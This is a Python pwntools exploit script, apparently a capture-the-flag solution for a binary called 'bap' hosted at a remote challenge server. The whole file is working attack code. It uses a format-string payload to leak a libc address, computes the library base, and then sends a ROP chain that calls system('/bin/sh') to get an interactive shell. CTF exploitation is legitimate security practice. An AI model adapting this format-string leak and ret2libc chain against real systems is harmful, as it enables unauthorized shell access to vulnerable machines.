import pwn
pwn.context.log_level="DEBUG"
e = pwn.ELF("./bap")
libc = pwn.ELF("./libc.so.6")
rop = pwn.ROP(e)
# io = pwn.process("./bap", env={"LD_PRELOAD":"./libc.so.6"})
io = pwn.remote("challs.actf.co", 31323)
# io: pwn.tubes.tube.tube = pwn.gdb.debug(
#     "./bap", """
#     b *main+64 
#     """,env={"LD_PRELOAD":"./libc.so.6"}
# )

io.recvuntil(b": ")

payload = b""
payload += b"%29$p" + b"a" * 3
payload += pwn.p64(0)
payload += pwn.p64(0)
ret = 0x00000000004011ce
payload += pwn.p64(ret)
payload += pwn.p64(e.sym["main"])
io.sendline(payload)
buf = io.recvuntil(b"aa")[:-2]
buf = int(buf, base=16)
libc_base = buf - 0x29e40
print(hex(buf))
# io.interactive()
out = io.recvuntil(b": ")

binsh = next(libc.search(b'/bin/sh\x00')) + libc_base
sys = libc.symbols['system'] + libc_base

payload = b""
# print(rop.find_gadget(['pop rdi', 'ret']))

payload += pwn.p64(0)
payload += pwn.p64(0)
payload += pwn.p64(0)
# pop_rdi_no_gadget_no_adoresu_no_ofusetto = 0x7ffff7fc651e - 0x7ffff7d89000
pop_rdi_no_gadget_no_adoresu_no_ofusetto = 0x2a3e5
payload += pwn.p64(pop_rdi_no_gadget_no_adoresu_no_ofusetto + libc_base)
# print(hex(pop_rdi_no_gadget_no_adoresu_no_ofusetto + libc_base))
payload += pwn.p64(binsh)
payload += pwn.p64(ret)
payload += pwn.p64(sys)
io.sendline(payload)



io.interactive()